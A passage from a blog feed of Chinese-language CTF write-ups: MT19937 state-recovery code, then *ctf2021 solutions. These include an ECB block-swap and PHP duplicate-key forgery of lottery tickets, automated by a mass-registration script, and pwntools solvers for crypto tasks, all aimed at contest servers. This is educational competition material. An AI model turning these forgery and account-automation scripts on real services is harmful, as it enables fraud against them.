class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">LeftXorMasked</span>(<span class="params">self,value, shift, mask,bits=<span class="number">32</span></span>):</span><br><span class="line">        tmp = value</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits // shift):</span><br><span class="line">            tmp = value ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br></pre></td></tr></table></figure><h3 id="2-逆向Twist"><a href="#2-逆向Twist" class="headerlink" title="2.逆向Twist"></a>2.逆向Twist</h3><p>观察<code>twist</code>函数，可知新的<code>state[i]</code>只和原来的<code>state[i]</code>、<code>state[i+1]</code>与<code>state[i+397]</code>有关，首先异或掉<code>state[i+397]</code>，之后我们讨论是否将结果与<code>0x9908b0df</code>异或，因为<code>0x9908b0df=0b10011001000010001011000011011111</code>，又因为<code>y&gt;&gt;1</code>操作得知之前的数的高位一定是<code>0</code>，所以我们之间判断最高位即可知道是否需要异或<code>0x9908b0df</code>，也就是能得知原来<code>state[i]</code>的最高位，那么再对<code>state[i-1]</code>进行还原，即可得到完整的<code>state[i]</code>了，具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">cur</span>):</span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y(tmp)</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y(tmp)</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res    </span><br><span class="line">    <span class="keyword">return</span> state</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;A-study-for-MT19937&quot;&gt;&lt;a href=&quot;#A-study-for-MT19937&quot; class=&quot;headerlink&quot; title=&quot;A study for MT19937&quot;&gt;&lt;/a&gt;A study for MT19937&lt;/h1&gt;&lt;p&gt;寒假前被一个伪随机数卡了，终于有时间来看看&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Write up for *ctf2021</title>
    <link href="http://example.com/2021/01/19/Wp_for_%E6%98%9Fctf&#39;s_crypto/"/>
    <id>http://example.com/2021/01/19/Wp_for_%E6%98%9Fctf&#39;s_crypto/</id>
    <published>2021-01-19T05:57:11.000Z</published>
    <updated>2021-03-11T01:20:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WP-for-ctf2021"><a href="#WP-for-ctf2021" class="headerlink" title="WP for *ctf2021"></a>WP for *ctf2021</h1><p>第一次和V&amp;N的师傅们打比赛就冲到了第六，好耶！</p><p>最后没AK，不好（悲）</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="lottery-again"><a href="#lottery-again" class="headerlink" title="lottery again"></a>lottery again</h3><p>看源码，找关键代码</p><p>加密部分</p><p><img src="https://i.loli.net/2021/01/19/ouXmL1yckdJHZzE.png" alt="29.png"></p><p>解密部分</p><p><img src="https://i.loli.net/2021/01/19/DpU1AXfdM6HBFQE.png" alt="30.png"></p><p>兑换彩票部分</p><p><img src="https://i.loli.net/2021/01/19/21UeVbGj9Cn6haf.png" alt="31.png"></p><p>分析函数可以发现在兑换彩票的时候，会对彩票密文进行解码，通过解码得到的彩票lottery内容从数据库中找到对应数据，取得可兑换的coin数量，并把coin加到解码得到的user账号的硬币中。</p><p>分析代码可知，从密文中取得的user账号没有与在数据库中的信息进行验证，故如果我们可以篡改密文中对应的user信息，那么就可以让a用户购买的彩票，给b用户使用，从而让b用户达到白嫖的目的。</p><p>我们发现加密方式为MCRYPT_RIJNDAEL_256，ECB模式，通过手动测试发现该算法的分组方式为32字节为一组，在这样的前提下，我们可以尝试替换储存在其中的user数据。</p><p>以下来逐步分析如何替换全部user-uuid信息</p><p>我们已有的密文数据是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">11-1111-1111-1111-111111111111&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;demodemo-demo-demo-d</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>如下为一个加密数据的明文内容，每一行的长度为0x20（除最后一行外</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">11-1111-1111-1111-111111111111&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>我们想要把其替换为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>也就是把user信息都从1替换成2 但是我们只可以替换其中的任何一个一行的内容，才不会造成解密错误。于是我们自然可以考虑替换第三行的内容，其标志着该彩票购买者的部分uuid信息。但是由于只是部分uuid信息，所以即使替换了也是如下情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>其user信息中的前六个字节无法被替换，由于六字节内容过长，不适合用爆破的方法来绕过。 但是如果我们考虑要把前六字节的信息也要替换的话，那么必须同时替换那一行的全部内容，也就是就会变成以下情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>也就是会造成lottery信息被替换，这会造成该彩票无法从数据库中读取到，直接报错。 最终考虑到以下构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lottery&quot;:&quot;b52d5239-24a5-4627-b</span><br><span class="line">a46-58a00645c3e4&quot;,&quot;user&quot;:&quot;111111</span><br><span class="line">emo-demodemodemo&quot;,&quot;user&quot;:&quot;222222</span><br><span class="line">22-2222-2222-2222-222222222222&quot;,</span><br><span class="line">&quot;coin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p>由于在php在json_decode的时候，后面的user会覆盖前面的user，也就是正确的user可以覆盖错误的user，成功修改user信息。</p><p>其他部分就是，需要注册、登录、购买、彩票、兑换彩票，可以写个脚本使其自动化。代码中的target为最终要用于购买flag的账号的一个彩票密文数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&quot;http://52.149.144.45:8080&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getheaders</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;api_token=&quot;</span> + token&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg</span>(<span class="params">user, pwd</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/user/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: pwd&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">user, pwd</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/user/login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: user, <span class="string">&quot;password&quot;</span>: pwd&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">token</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/buy&quot;</span>, data=&#123;<span class="string">&quot;api_token&quot;</span>: token&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hijack</span>(<span class="params">enc, enc2</span>):</span><br><span class="line">    enc = base64.b64decode(enc)</span><br><span class="line">    enc2 = base64.b64decode(enc2)</span><br><span class="line">    <span class="keyword">return</span> enc[:<span class="number">0x40</span>] + enc2[<span class="number">0x20</span>:<span class="number">0x60</span>] + enc[<span class="number">0x60</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInfo</span>(<span class="params">enc</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/info&quot;</span>, data=&#123;<span class="string">&quot;enc&quot;</span>: enc&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charge</span>(<span class="params">user, coin, enc</span>):</span><br><span class="line">    text = req.post(url + <span class="string">&quot;/lottery/charge&quot;</span>, data=&#123;<span class="string">&quot;user&quot;</span>: user, <span class="string">&quot;enc&quot;</span> : enc, <span class="string">&quot;coin&quot;</span> : coin&#125;).text</span><br><span class="line">    data = json.loads(text)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;***************jjXj40HxYWzD7/wbbu6LB8hKIgHzspmlNP0zCwC07w6uK7rCLP2MvVoq8P2oXt+OoD1NY2Ba5J5Hs1AiZkdxBRIrTSq9H8y2BmPiCmO6fH2d9eJW+rk8BfTg14RVjLwF1pW5cSqW2FXVyWb0j5c8edRkKKGE=&#x27;</span></span><br><span class="line">uuid = getInfo(target)[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    reg_data = reg(<span class="string">&#x27;wjhflag&#x27;</span> + <span class="built_in">str</span>(i), <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">    login_data = login(<span class="string">&#x27;wjhflag&#x27;</span> + <span class="built_in">str</span>(i), <span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">    token = login_data[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        buy_data = buy(token)</span><br><span class="line">        enc = buy_data[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line">        fake_enc = base64.b64encode(hijack(enc, target))</span><br><span class="line">        data = charge(uuid, <span class="number">0</span>, fake_enc)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="GuessKey"><a href="#GuessKey" class="headerlink" title="GuessKey"></a>GuessKey</h3><p>憨憨出题人把key给出来了，<del>猜</del>（复制）数字</p><h3 id="GuessKey2"><a href="#GuessKey2" class="headerlink" title="GuessKey2"></a>GuessKey2</h3><p>GuessKey_fix <del>其实就是不给key了</del></p><p>先分析题目，看起来是要让我们去猜这个<code>key</code>，但显然不可能成功</p><p>接着看下面发现我们每次可以给服务器发送一个<code>mask</code>，来对这个<code>key</code>进行改变，而改变的位置是<code>key</code>中<code>0</code>所在的位置随机选两个的区间来与<code>mask</code>异或，那么也就是说，每次选取的起止位置都是<code>0</code>，那么也就是说每一次的<code>mask</code>都会影响到这两个<code>0</code></p><p>我们选择<code>mask</code>每一次都打<code>1</code>，这样每次的这两个<code>0</code>都会被异或成<code>1</code>（虽然有些地方也变成了<code>0</code>），但是相较于上一个状态，<code>0</code>的区间是被缩小了的，也就是说，在有限次的<code>mask</code>处理过后，<code>key</code>会变成<code>0b1111111111111111111111111111111111111111111111111111111111111111</code>，所以我们每次的<code>guess</code>就可以作为检测，当我们得到<code>Nice.</code>时，也就可以得知此时的<code>key</code>是<code>0b1111111111111111111111111111111111111111111111111111111111111111</code>，相当于<code>key</code>已知，和<code>GuessKey</code>就变成了一道题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;52.163.228.53&quot;</span>, <span class="string">&quot;8082&quot;</span>)</span><br><span class="line">turn = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    turn += <span class="number">1</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;mask:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;guess:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;18446744073709551615&#x27;</span>)</span><br><span class="line">    back = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(turn,back)</span><br><span class="line">    <span class="keyword">if</span>(back == <span class="string">b&#x27;Nice.&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;mask:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;guess:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;18446744073709551615&#x27;</span>)</span><br><span class="line">    back = r.recvline(<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(turn,back)</span><br><span class="line"></span><br><span class="line">flag = r.recvline(<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="MyEnc"><a href="#MyEnc" class="headerlink" title="MyEnc"></a>MyEnc</h3><p>这个题把<code>flag</code>当成<code>key</code>，对于我们给出的每个数字根据<code>key</code>的接下来6位对<code>iv</code>进行操作，因为我们已知<code>flag</code>的格式为<code>*CTF&#123;...&#125;</code>，所以我们对于<code>key</code>的前几十位是已知的，所以可以通过前几次操作来得到我们想要的东西</p><p>因为返回的值是 $iv+(m ⊕ q)^{i^{i^i}}$ ，我们简记为 $iv+(m⊕q)^{x}$ ，那么我们可以两次令<code>m</code>为0，得到数的即为 $iv+q^x$ 与 $iv+q^y$ ，可知 $q &#x3D; gcd(n,(iv+q^x)-(iv+q^y))$ ，那么<code>n</code>就可以被轻松分解</p><p>接着我们可以令<code>m</code>等于<code>q</code>，这样就可以得到<code>iv</code></p><p>接下来再令<code>m</code>等于0（其实等于几都能算，等于0方便点而已），由于<code>iv</code>、<code>q</code>全部已知，而且状态不超过 $2^7$ ，即可爆破状态，即为此时的6位<code>key</code></p><p>手动补全前几位的<code>key</code>，然后不断通过爆破得到接下来的6位<code>key</code>，当<code>key</code>的长度达到120时，前120位即为<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;52.163.228.53&quot;</span>, <span class="string">&quot;8081&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">passpow</span>():</span><br><span class="line">rev = r.recvuntil(<span class="string">&quot;sha256(xxxx+&quot;</span>)</span><br><span class="line">suffix = r.recv(<span class="number">16</span>).decode()</span><br><span class="line">r.recvuntil(<span class="string">&quot; == &quot;</span>)</span><br><span class="line">res = r.recv(<span class="number">64</span>).decode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">hashresult = hashlib.sha256((x+suffix).encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> hashresult == res:</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">prefix = util.iters.mbruteforce(f,table,<span class="number">4</span>,<span class="string">&#x27;upto&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me xxxx:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(prefix))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">talk</span>(<span class="params">x</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;give me a number:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">r.recvuntil(<span class="string">&quot;done: &quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Successfully pass the pow!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;n: &quot;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(r.recvline(<span class="literal">False</span>).strip().decode())</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">a = talk(<span class="number">0</span>)</span><br><span class="line">b = talk(<span class="number">0</span>)</span><br><span class="line">delta = b+n-a</span><br><span class="line"></span><br><span class="line">q = gcd(delta,n)</span><br><span class="line"><span class="keyword">assert</span> q != <span class="number">1</span></span><br><span class="line">p = n // q</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">iv = talk(q)</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">elist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">elist.append(<span class="built_in">pow</span>(i,<span class="built_in">pow</span>(i,i,phi),phi))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;001010100100001101010&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">len</span>(flag)&lt;<span class="number">120</span>):</span><br><span class="line">delta = talk(<span class="number">0</span>) - iv</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">tmp = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp)):</span><br><span class="line"><span class="keyword">if</span>(tmp[j] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">res += <span class="built_in">pow</span>(q,elist[j],n)</span><br><span class="line">res %= n</span><br><span class="line"><span class="keyword">if</span>(delta%n == res):</span><br><span class="line">flag += <span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = flag[:<span class="number">120</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="little-case"><a href="#little-case" class="headerlink" title="little case"></a>little case</h3><p>题目分为两部分，一个是<code>little_trick</code>，一个是<code>real_trick</code></p><p>阅读代码后发现<code>little_trick</code>就是<code>RSA</code>的<code>wiener attack</code>，最后即可分解<code>n</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561</span></span><br><span class="line">p1 = <span class="number">125457275769068125757485908164006976153846494199951055956773829512867658202991509882220598391130551501414264867302691498062034690987771420463818096949614464177297177742292221196272475473441901790650971196178740160270878352307469807794533558079725928555246759355468676092854618354193968504322694550607414849887</span></span><br><span class="line">q1 = <span class="number">172725732665160218766764654273481422951178250693790825716359642314019315013321867434849375780994146440118500992456863730311444752367847389052666095324149584230474450693683416636565463345342017830651196454735159385924736453857045827989347928771104006978412412405607299616293396656259291378061505961429915687703</span></span><br><span class="line">e1 = <span 